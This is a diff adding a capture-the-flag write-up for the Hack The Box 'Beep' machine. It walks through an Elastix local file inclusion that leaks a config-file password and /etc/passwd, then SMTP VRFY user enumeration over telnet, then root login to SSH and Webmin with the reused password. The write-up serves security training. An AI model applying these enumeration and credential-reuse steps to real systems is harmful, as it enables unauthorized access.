@@ -61,7 +61,89 @@
 
 // Navigating to http://10.10.10.7/ redirect us to HTTPS(port 443) https://10.10.10.7/ , its a login page of elastix(private branch exchange software)
 
-![Image 1]()
+![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Beep/1.png)
 
-// 
+// Also we got another login page on port 10000 for webmin service (we will save that for later)
 
+![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Beep/2.png)
+
+// Searching for exploit to elastix service in [ExploitDB](https://www.exploit-db.com/) found me a 'Local file inclusion vulnerability'
+
+![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Beep/4.png)
+
+// Looking at the vulnerabillity help to understand the picture
+
+![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Beep/5.png)
+
+// Lets try that !
+
+![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Beep/3.png)
+
+// It worked !, since the exploit suggested a config file for the PBX, we have got some potential passwords
+
+    # AMPDBPASS=amp109
+    AMPDBPASS=jEhdIekWmdjE
+    AMPENGINE=asterisk
+    #AMPMGRPASS=amp111
+
+// Lets try to get passwd file
+
+![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Beep/6.png)
+
+// Also worked !, So we got users 
+
+    sync
+    shutdown
+    halt
+    news
+    mysql
+    cyrus
+    asterisk
+    spamfilter
+    fanis
+
+// Lets save them to a file and since we got SMTP service running
+
+// we can try to connect this service with telnet and verify the user we got
+
+    $ telnet 10.10.10.7 25
+------
+
+    Trying 10.10.10.7...
+    Connected to 10.10.10.7.
+    Escape character is '^]'.
+
+// command 'EHLO' with anything just shows options
+
+    EHLO W0lfysec
+    250-beep.localdomain
+    250-PIPELINING
+    250-SIZE 10240000
+    250-VRFY
+    250-ETRN
+    250-ENHANCEDSTATUSCODES
+    250-8BITMIME
+    250 DSN
+
+// command 'VRFY' will verify if user mail exist (status: 550-NOT exist, 252-Exist)
+
+    VRFY W0lfysec@localhost
+    550 5.1.1 <r4r3@localhost>: Recipient address rejected: User unknown in local recipient table
+    VRFY halt@localhost
+    252 2.0.0 halt@localhost
+    VRFY fanis
+    252 2.0.0 fanis
+
+// Since we got verify users and we got some passes and SSH service open
+
+// we could try to connect to machine(credential root:jEhdIekWmdjE worked!) but it seems to easy
+
+// Let go back to the webmin login page at https://10.10.10.7:10000/ and try to login as root : jEhdIekWmdjE
+
+![Image 7](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Beep/7.png)
+
+// Searching the app a little bit i foud a command shell option at others option
+
+// since we loged in as root we can get the flags !
+
+![Image 8](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Beep/8.png)
